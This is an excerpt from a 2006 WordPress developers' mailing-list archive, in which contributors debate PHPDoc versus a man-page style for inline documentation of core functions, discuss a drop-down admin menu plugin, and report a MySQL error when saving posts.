>> even if I have to do them myself, and even if they aren't committed.
> 
> That's the spirit.
> 
> Rich, now that you have an answer, are you still enthusiastic about
> documenting the core?

Indeed I am. And, since I have selfish reasons for wanting to do this,
as well as work-related reasons, it seems likely that I will actually
end up doing it, and not just talk about it. :-) And, of course, I have
a lot of the patches already, but they need some cleaning up.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Fri Feb 17 13:35:15 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 13:37:05 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>	<43F4E337.7090209@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com>	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
Message-ID: <43F5D113.7010100@rcbowen.com>

Robert Deaton wrote:
> On 2/16/06, Theodor Ramisch <theodor_ramisch@hotmail.com> wrote:
>> one of the plugins I modified last week was very well commented.
>> Maybe we could use this style. (Is it phpDoc?)
>> http://dev.wp-plugins.org/file/google-sitemap-generator/trunk/sitemap.php
> 
> Yes, that is PHPDoc, and it seems to match perfectly with what I would
> like to see in the core, (nothing really complex like what Rich has, I
> love the effort, but the format he suggested in the other list is
> rather...ick.

Could you elaborate on this? "ick" is rather non-descriptive, and more
detail would be greatly appreciated.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Fri Feb 17 13:44:44 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 13:46:31 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
Message-ID: <43F5D34C.3080809@rcbowen.com>

Andy Skelton wrote:
> On 2/16/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>> +/** current_time( $type = ('mysql'|'timestamp')
>> +*               [ , $gmt = (true|false) ] )
>> +*/
> 
> If this is meant to help people read the code, I think it's too cryptic.

It lists the arguments (type and gmt) with, in this case, their possible
values (type can be either 'mysql' or 'timestamp', and gmt can be either
true or false). The [ ] indicates an optional argument. This syntax is
fairly common in man-page type documentation.

I'm going for API documentation, not "use this to learn how to write
PHP" documentation. It is assumed that folks will be willing to learn
what the notation means. And once you've learned it, the docs become clear.

Please note that this syntax came out of more than an hour of IRC
conversation as being just about the most verbose thing that would
possibly be accepted.

There is a (I think rather unwarranted) fear of making the code files
larger.

However, this isn't a patch that's been accepted. It's proposed. Don't
just say it's too cryptic. Say what you think it should be instead. If
you write a paragraph about what the function does, the patch will
almost certainly be rejected. I've been assured of that by the IRC
conversation. I'd rather not waste time submitting patches that I know
will be rejected.

-- 
Rich Bowen
rbowen@rcbowen.com
From lists at abhaykumar.net  Fri Feb 17 13:47:26 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 13:49:16 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F5D113.7010100@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
Message-ID: <512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>

> > [snip]
> > Yes, that is PHPDoc, and it seems to match perfectly with what I would
> > like to see in the core, (nothing really complex like what Rich has, I
> > love the effort, but the format he suggested in the other list is
> > rather...ick.
>
> Could you elaborate on this? "ick" is rather non-descriptive, and more
> detail would be greatly appreciated.

He is talking about this:

> +/** current_time( $type = ('mysql'|'timestamp')
> +*               [ , $gmt = (true|false) ] )
> +*/
>  function current_time($type, $gmt = 0) {

from your other post. That's not as useful as something like this:

/**
  * @param type string 'mysql' | 'timestamp'
  * @param gmt boolean
  * @return whatever
  */
function current_time($type, $gmt = 0) {

- Abhay
--
Abhay Kumar
http://abhaykumar.net/
From dstewart at atl.lmco.com  Fri Feb 17 14:07:01 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Feb 17 14:08:52 2006
Subject: [wp-hackers] Poposal to improve Admin menu
In-Reply-To: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
Message-ID: <43F5D885.5030500@atl.lmco.com>

Stefano wrote:
> I think that the functionality actually provided by the great plugin
> from Ozh: Admin Drop Down Menu
> (http://frenchfragfactory.net/ozh/my-projects/wordpress-admin-menu-drop-down-css/)
> should be included in 2.next release. It' improve the usability,
> making jump aorun various admin screen fast.
> 
> What do you think?
> 

I get artifacts using Ozh's plugin due to the large number of plugins 
that have admin pages on my install. The Options menu is constantly 
overrunning the other menus.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From rbowen at rcbowen.com  Fri Feb 17 15:05:57 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 15:07:46 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<43F4E642.3050300@midnightcircus.com>	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
Message-ID: <43F5E655.1080608@rcbowen.com>

Abhay Kumar wrote:
>>> [snip]
>>> Yes, that is PHPDoc, and it seems to match perfectly with what I would
>>> like to see in the core, (nothing really complex like what Rich has, I
>>> love the effort, but the format he suggested in the other list is
>>> rather...ick.
>> Could you elaborate on this? "ick" is rather non-descriptive, and more
>> detail would be greatly appreciated.
> 
> He is talking about this:
> 
>> +/** current_time( $type = ('mysql'|'timestamp')
>> +*               [ , $gmt = (true|false) ] )
>> +*/
>>  function current_time($type, $gmt = 0) {
> 
> from your other post. That's not as useful as something like this:
> 
> /**
>   * @param type string 'mysql' | 'timestamp'
>   * @param gmt boolean
>   * @return whatever
>   */
> function current_time($type, $gmt = 0) {

I was hoping for some clarification on the term "ick", which doesn't
mean much. I suppose that sort of answers for this particular case.

The syntax "@param" doesn't mean anything to me. Why "@" on that? Is
that supposed to signify something that I'm missing?

-- 
Rich Bowen
rbowen@rcbowen.com
From lists at abhaykumar.net  Fri Feb 17 15:17:38 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 15:19:30 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F5E655.1080608@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com>
Message-ID: <512061b90602170717g615cd31fod27bafd1a68a6c59@mail.gmail.com>

> [snip]
> I was hoping for some clarification on the term "ick", which doesn't
> mean much. I suppose that sort of answers for this particular case.
>
> The syntax "@param" doesn't mean anything to me. Why "@" on that? Is
> that supposed to signify something that I'm missing?

It's the phpdocumentor syntax that is used. check the wiki (codex)
page and read a few of the posts that you missed on this thread.

-Abhay

--
Abhay Kumar
http://abhaykumar.net/
From ringmaster at midnightcircus.com  Fri Feb 17 15:32:51 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 17 15:33:43 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F5E655.1080608@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>	<43F4E642.3050300@midnightcircus.com>	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com>
Message-ID: <43F5ECA3.3070800@midnightcircus.com>

Rich Bowen wrote:
> Abhay Kumar wrote:
>> /**
>>   * @param type string 'mysql' | 'timestamp'
>>   * @param gmt boolean
>>   * @return whatever
>>   */
>> function current_time($type, $gmt = 0) {
> 
> The syntax "@param" doesn't mean anything to me. Why "@" on that? Is
> that supposed to signify something that I'm missing?
> 

Using "@param" allows existing documentation parsers to extract the 
documentation you've provided.

Using the short format you suggested, you would need to write a whole 
new parser to extract the parameters.  If you use the @param PHPDoc 
format, then PHPDocumentor can produce searchable HTML documentation, 
and editors like Zend's Dev Studio can provide live parameter insight. 
This documentation style is pretty standard in PHP projects, and is used 
it a lot of PEAR code that I've seen.

If you use the style you suggested, it will be difficult to build a 
parser to output non-source code developer documentation, because there 
is no token to indicate that your comment is anything special.

To nitpick a little:
* There isn't really a need to include the function name since it's 
right there under the comment
* The comment doesn't say what the function does/what thing the function 
returns

Using this particular function as an example, I don't know if I'm going 
to get a unix timestamp integer or a string-format in response.  I also 
don't know if it is going to return system time or MySQL time.

Here's (IMO) a reasonable PHPDoc comment:

/**
  * returns the system time in the format specified by $type
  * @param type string 'mysql' | 'timestamp'
  * @param gmt boolean
  * @return mixed
  */

Owen

From himself at arnebrachhold.de  Fri Feb 17 15:37:35 2006
From: himself at arnebrachhold.de (Arne Brachhold)
Date: Fri Feb 17 15:40:26 2006
Subject: [wp-hackers] Inline documentation
References: <43F33C8D.2010509@rcbowen.com>	<43F4E642.3050300@midnightcircus.com>	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com><512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com>
Message-ID: <006e01c633d8$2e2f1d70$020e0c0a@soulnet.local>

Hi,

>> /**
>>   * @param type string 'mysql' | 'timestamp'
>>   * @param gmt boolean
>>   * @return whatever
>>   */
>> function current_time($type, $gmt = 0) {
> 
> 
> The syntax "@param" doesn't mean anything to me. Why "@" on that? Is
> that supposed to signify something that I'm missing?

that's the phpDoc syntax. A list of valid tags is available at
http://www.phpdoc.de/kongress/tags.html (Sorry, in German only).

The advantage of this system is that there are a lot of PHP
IDEs which parse these tags and show the parameters if you
start typing the function name (autocomplete).

The phpDoc syntax is widely used and easy to read and learn.
Of course, it has a little more overhead compared to your
solution, but I would prefer to chose a sytax which is already
used and has software support like tools for building 
documentation pages.

A full phpDoc comment for a method or function can look like
this:

/**
* First Line: Short text about the function.
* 
* More detailed comment about the function
* Overview first, then detailed comment and tags.
* 
* @param  string   $param1 Description of parameter 1
*                  Can have multiple lines two.
* @param  string   $param2 Another param
* @return boolean  False on a problem, true on success
* @see    otherfunction(), $othervar, myClass::myMethod()
* @deprecated 2.1 - 2000/12/06
* @link http://codex.wordpress.org/Removed_functions Add. info why deprecated
*/
function render($param1 , $param2) { 
   if(problem()) return false;
   else return true;
}


Arne


From lists at abhaykumar.net  Fri Feb 17 15:48:20 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 15:50:10 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <006e01c633d8$2e2f1d70$020e0c0a@soulnet.local>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com>
	<006e01c633d8$2e2f1d70$020e0c0a@soulnet.local>
Message-ID: <512061b90602170748q1f48d83ei5620b80d2bff169@mail.gmail.com>

> [snip]
> that's the phpDoc syntax. A list of valid tags is available at
> http://www.phpdoc.de/kongress/tags.html (Sorry, in German only).
It is both the syntax for phpdocumentor and phpdoc. An english list is
linked on the codex page
(http://codex.wordpress.org/Inline_Documentation).

I discussed the possible tags we could use, earlier:
http://comox.textdrive.com/pipermail/wp-hackers/2006-February/005002.html
(happier now, skippy? next time if you have a comment, tell me
directly instead of just spewing to IRC)

> A full phpDoc comment for a method or function can look like
> this:

Another great reference is the PEAR manual which contains a litlte
more than is needed here but you can see the synatax in action.

http://pear.php.net/manual/en/standards.sample.php

- Abhay
--
Abhay Kumar
http://abhaykumar.net/
From dmhouse at gmail.com  Fri Feb 17 16:18:51 2006
From: dmhouse at gmail.com (David House)
Date: Fri Feb 17 16:20:45 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F5ECA3.3070800@midnightcircus.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
Message-ID: <ebe43d680602170818y5ae5f1f5i@mail.gmail.com>

On 17/02/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Here's (IMO) a reasonable PHPDoc comment:
>
> /**
>   * returns the system time in the format specified by $type
>   * @param type string 'mysql' | 'timestamp'
>   * @param gmt boolean
>   * @return mixed
>   */

As Matt has expressed his distaste for comments before really short
functions, here's a more complicated example for list_cats()
(attached).

Issues raised by writing this:

* I found four completely pointless parameters. Four! (the three
listed as 'Doesn't seem to do anything', then $hierarchical as well)
Here shows the benefits of documenting.
* I hope the format is to taste, I didn't bother with anything other
than @param and @return.
* What to do about functions that don't return anything? @return
nothing, @return null or just no @return at all?
* Hopefully my explanations of the parameters were clear enough.
No-one ever has to go through that function again, they just check the
reference at the top.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
-------------- next part --------------
/**
* Output a list of categories
* 
* @param $optionall				Doesn't seem to do anything
* @param $all					Doesn't seem to do anything
* @param $sort_column			string; Which column in the categories table to order the results by. Default 'ID'
* @param $sort_order			'asc' | 'desc'; Whether to order ascending or descending. Deafult 'asc'
* @param $file					Doesn't seem to do anything
* @param $list					bool; If true, output as a <ul>, otherwise just seperate categories with a <br/>. Default true
* @param $optiondates			bool; Whether to output dates of when the last post was published to each category. Default false
* @param $optioncount			bool; Whether to output a count of the number of posts in each category. Default false
* @param $hide_empty			bool; Whether to hide categories with no posts in them. Default true
* @param $use_desc_for_title	bool; Whether to use the category's description for the title attribute of the link.  Default true
* @param $children				bool; Whether do display category children for each category. See also $hierarchical. Default false
* @param $child_of				int; The ID of the category you want to display. Default 0 = all categories
* @param $categories			array or 0; The array of categories to iterate over. Default 0 = get all categories from DB
* @param $recurse				bool; Don't set, is used as a state parameter when internally recursing. Default 0
* @param $feed					string; Set to the name of a feed if you want to output links to the feed for each category. Default ''
* @param $feed_image			string; Set to an image URL if you want to output an image and a link as above. Default ''
* @param $exclude				string; A comma seperated list of category IDs of categories to exclude. Default ''
* @param $hierarchical			bool; exactly the same as $children: you must set both for them to take affect. Default false
*/
From steagl at people.it  Fri Feb 17 16:36:51 2006
From: steagl at people.it (Stefano)
Date: Fri Feb 17 16:38:51 2006
Subject: [wp-hackers] Poposal to improve Admin menu
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
	<43F5D885.5030500@atl.lmco.com>
Message-ID: <boubv1pt53e7bd7s4qmd9jmf5ku1g7is5e@4ax.com>

Il Fri, 17 Feb 2006 09:07:01 -0500, Doug Stewart
<dstewart@atl.lmco.com> scrive:

>Stefano wrote:
>> I think that the functionality actually provided by the great plugin
>> from Ozh: Admin Drop Down Menu
>> (http://frenchfragfactory.net/ozh/my-projects/wordpress-admin-menu-drop-down-css/)
>> should be included in 2.next release. It' improve the usability,
>> making jump aorun various admin screen fast.
>> 
>> What do you think?
>> 
>
>I get artifacts using Ozh's plugin due to the large number of plugins 
>that have admin pages on my install. The Options menu is constantly 
>overrunning the other menus.

 didn't notice it but i have only 5 or 6 plugin with admin page, maybe
turning the 2 level menu to a dropdown menu would help solving the
problem. Moving the plugin admin pages in a specific mennu should
help.

The idea is to have something that allow you to access the second
level options directly without the need to reload page just to have
access to a second level menu, people using slow connection will
apreciate it a lot. :)

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From davebytes at comcast.net  Fri Feb 17 16:05:58 2006
From: davebytes at comcast.net (David Chait)
Date: Fri Feb 17 16:39:19 2006
Subject: [wp-hackers] "_pingme" postmeta INSERT issues? (on multiple hosts)
Message-ID: <001d01c633dc$0a5b38d0$6e01a8c0@sixfour>

Thought I'd help Podz out and post this one for perusal... ;)  Didn't find 
anything on quick glance in Trac, but I don't really use Trac... :)

Thread is:
http://wordpress.org/support/topic/59987

Error during post saves, something like:

WordPress database error: [Lost connection to MySQL server during query]
INSERT INTO wp_postmeta (post_id,meta_key,meta_value) VALUES 
('70','_pingme','1')

Multiple reports all the same; the _pingme thing that seems to be failing 
(not sure if it's constant or sporadic...).

-d 

From nuclearmoose at gmail.com  Fri Feb 17 17:54:55 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb 17 17:56:45 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <43F5D34C.3080809@rcbowen.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
	<43F5D34C.3080809@rcbowen.com>
Message-ID: <5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>

On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>
>
> I'm going for API documentation, not "use this to learn how to write
> PHP" documentation. It is assumed that folks will be willing to learn
> what the notation means. And once you've learned it, the docs become
> clear.


I'm totally willing to learn what the notation means, but my concept of the
inline documentation is a tool to help me figure out what a particular
function is about. I'm not looking for a tutorial at every variable and
array on where the data are coming from, how they are processed, and where
they are going after that bit of code is executed. If I only have a short
explanation, or indeed a label of some kind, then I know that I can search
Codex for more detailed information.

Understand that I don't have any issue with your suggestion as it stands,
however I guess we are both approaching this from two interpretations of
needs. As I said, I don't expect a "War and Peace" explanation, but I do
need something that I can use to at least know what to do research for.

This is why Carthik right asserted that we need to agree on some terms of
reference and such prior to embarking upon the actual work. If it is
determined that the inline docs are appropriately done as per your API
notation, then so be it, but at this point, I know that there are at least
two people with two different concepts of what the ID project is for and
should accomplish.

I totally appreciate and understand your concerns regarding
"over-documentation" as well as doing a whole crapload of work that may
actually be rejected by those in charge of commits, and I whole-heartedly
agree that we cannot have that situation.

Craig.
From carthik at gmail.com  Fri Feb 17 17:58:11 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Fri Feb 17 18:00:01 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
Message-ID: <80f75db0602170958v104151ebq4a41936bb8c04cf@mail.gmail.com>

On 2/17/06, David House <dmhouse@gmail.com> wrote:
> On 17/02/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> > Here's (IMO) a reasonable PHPDoc comment:
> >
> > /**
> >   * returns the system time in the format specified by $type
> >   * @param type string 'mysql' | 'timestamp'
> >   * @param gmt boolean
> >   * @return mixed
> >   */
>
> As Matt has expressed his distaste for comments before really short
> functions, here's a more complicated example for list_cats()
> (attached).
>
> Issues raised by writing this:
>
> * I found four completely pointless parameters. Four! (the three
> listed as 'Doesn't seem to do anything', then $hierarchical as well)
> Here shows the benefits of documenting.
Digressing from the main topic here:
David, some of the "Doesn't seem to do anything" params (like `all`
and `optionall`) are actually supposed to do stuff , and they did,
prior to a commit that broke that functionality. I suppose that is a
bug, then.
http://comox.textdrive.com/pipermail/wp-docs/2006-January/001232.html
is where I wrote up about this recently.

> * I hope the format is to taste, I didn't bother with anything other
> than @param and @return.
> * What to do about functions that don't return anything? @return
> nothing, @return null or just no @return at all?
Why don't we use @return void ?

> * Hopefully my explanations of the parameters were clear enough.
> No-one ever has to go through that function again, they just check the
> reference at the top.
Yes, a brief description of parameters, and what they mean should be
what is necessary and sufficient. I often find myself using a phpxref
install just to figure these things out, and each time, I read the
function in question and figure out what the heck parameter X does.

Carthik.
From nuclearmoose at gmail.com  Fri Feb 17 18:00:04 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb 17 18:02:08 2006
Subject: [wp-hackers] Poposal to improve Admin menu
In-Reply-To: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
Message-ID: <5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>

On 2/17/06, Stefano <steagl@people.it> wrote:
>
> I think that the functionality actually provided by the great plugin
> from Ozh: Admin Drop Down Menu
> (
> http://frenchfragfactory.net/ozh/my-projects/wordpress-admin-menu-drop-down-css/
> )
> should be included in 2.next release. It' improve the usability,
> making jump aorun various admin screen fast.
>
> What do you think?


I have this plugin installed, and I too have artifacts showing up. Also, I
find it annoying and frustrating that unless I move my mouse in a precisely
linear fashion, the drop down menu continually disappears. In this respect,
it does not add any value to my admin panel workflow, as it is easier to
simply click and click as needed without having to worry about where my
mouse pointer is hovering.

This plugin is best left as a plugin, IMO, and not be part of the core. If
it was part of the core, I would disable it.

Craig.
From carthik at gmail.com  Fri Feb 17 18:03:12 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Fri Feb 17 18:05:06 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
	<43F5D34C.3080809@rcbowen.com>
	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>
Message-ID: <80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>

On 2/17/06, Craig <nuclearmoose@gmail.com> wrote:
> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> >
> >
> > I'm going for API documentation, not "use this to learn how to write
> > PHP" documentation. It is assumed that folks will be willing to learn
> > what the notation means. And once you've learned it, the docs become
> > clear.

Rich, I suppose we both agree we are working towards something that is
immediately useful to programmers. The benefit of using a system, such
as phpdocumentor, for one, is that people can read the same comments,
and browse the source at an automatically generated webpage. So it
might be better to adapt to an existing system rather than create a
new lingo (like it is better to use WP that to hand code a blog :) )

> I'm totally willing to learn what the notation means, but my concept of the
> inline documentation is a tool to help me figure out what a particular
> function is about. I'm not looking for a tutorial at every variable and
> array on where the data are coming from, how they are processed, and where
> they are going after that bit of code is executed. If I only have a short
> explanation, or indeed a label of some kind, then I know that I can search
> Codex for more detailed information.

Craig,
You will get the parameters(Variables), their "type", what they do,
and what the whole function does, which should be good enough, I
guess. All this, with the phpdocumentor style of commenting.

Carthik.
--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From dto at dev.java.net  Fri Feb 17 18:06:10 2006
From: dto at dev.java.net (Dan Li)
Date: Fri Feb 17 18:08:00 2006
Subject: [wp-hackers] Poposal to improve Admin menu
In-Reply-To: <5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
	<5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
Message-ID: <63900d140602171006y6af4ce83u334b11652618e970@mail.gmail.com>

> Also, I
> find it annoying and frustrating that unless I move my mouse in a precisely
> linear fashion, the drop down menu continually disappears.
[...]
> This plugin is best left as a plugin, IMO, and not be part of the core. If
> it was part of the core, I would disable it.

+1 for frustration and keeping it out of the core.

Regards,
  - Dan Li
From mark.wordpress at txfx.net  Fri Feb 17 18:09:50 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb 17 18:11:41 2006
Subject: [wp-hackers] Poposal to improve Admin menu
In-Reply-To: <5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
	<5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
Message-ID: <4742B752-53FB-441F-A538-F69D6B321804@txfx.net>

On Feb 17, 2006, at 1:00 PM, Craig wrote:

> This plugin is best left as a plugin, IMO, and not be part of the  
> core. If
> it was part of the core, I would disable it.

As-is, I wouldn't put it in core either... but a core patch opens up  
more possibilities... things that Ozh couldn't have done with a  
strict plugin.  The idea has merit, it just needs the right execution.
--
Mark Jaquith
http://txfx.net/


From nuclearmoose at gmail.com  Fri Feb 17 18:10:34 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb 17 18:12:24 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
	<43F5D34C.3080809@rcbowen.com>
	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>
	<80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>
Message-ID: <5aa3aa0602171010g5b1d346ax56afec61163dd051@mail.gmail.com>

On 2/17/06, Carthik Sharma <carthik@gmail.com> wrote:
>
> <snip>
> Craig,
> You will get the parameters(Variables), their "type", what they do,
> and what the whole function does, which should be good enough, I
> guess. All this, with the phpdocumentor style of commenting.
>
> Carthik.


Works for me!
Craig.
From dto at dev.java.net  Fri Feb 17 18:33:27 2006
From: dto at dev.java.net (Dan Li)
Date: Fri Feb 17 18:35:18 2006
Subject: [wp-hackers] Poposal to improve Admin menu
